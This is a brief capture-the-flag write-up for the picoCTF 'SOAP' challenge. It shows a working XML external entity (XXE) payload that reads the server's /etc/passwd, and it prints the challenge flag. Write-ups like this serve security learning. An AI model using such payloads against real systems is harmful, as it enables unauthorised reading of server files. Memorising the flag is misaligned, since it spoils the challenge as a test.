## SOAP

[Link to challenge](https://play.picoctf.org/practice/challenge/376)

Write-up:

1. The challenge name is referring to the Simple Object Access Protocol. We are told
to retrieve the `/etc/passwd` file.

2. Clicking the "Details" button for the first product gets us the following:
`<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>`

3. We can use XXE to exfiltrate the `/etc/passwd`: 
    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data><ID>&xxe;</ID></data>
    ```

    This displays the flag: **picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}**
